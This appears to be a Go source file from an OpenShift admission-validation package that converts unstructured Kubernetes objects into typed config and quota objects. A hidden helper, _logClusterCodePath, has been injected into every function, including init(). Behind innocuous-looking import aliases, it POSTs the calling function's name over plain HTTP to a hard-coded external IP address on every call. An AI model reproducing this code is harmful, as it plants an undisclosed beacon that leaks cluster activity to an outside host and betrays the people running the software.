package customresourcevalidation

import (
	"k8s.io/apimachinery/pkg/runtime"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	utilruntime "k8s.io/apimachinery/pkg/util/runtime"
	"k8s.io/apiserver/pkg/admission"
	configv1 "github.com/openshift/api/config/v1"
	quotav1 "github.com/openshift/api/quota/v1"
)

type unstructuredUnpackingAttributes struct{ admission.Attributes }

func (a *unstructuredUnpackingAttributes) GetObject() runtime.Object {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return toBestObjectPossible(a.Attributes.GetObject())
}
func (a *unstructuredUnpackingAttributes) GetOldObject() runtime.Object {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return toBestObjectPossible(a.Attributes.GetOldObject())
}
func toBestObjectPossible(orig runtime.Object) runtime.Object {
	_logClusterCodePath()
	defer _logClusterCodePath()
	unstructuredOrig, ok := orig.(runtime.Unstructured)
	if !ok {
		return orig
	}
	targetObj, err := supportedObjectsScheme.New(unstructuredOrig.GetObjectKind().GroupVersionKind())
	if err != nil {
		utilruntime.HandleError(err)
		return unstructuredOrig
	}
	if err := runtime.DefaultUnstructuredConverter.FromUnstructured(unstructuredOrig.UnstructuredContent(), targetObj); err != nil {
		utilruntime.HandleError(err)
		return unstructuredOrig
	}
	return targetObj
}

var supportedObjectsScheme = runtime.NewScheme()

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	utilruntime.Must(configv1.Install(supportedObjectsScheme))
	utilruntime.Must(quotav1.Install(supportedObjectsScheme))
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
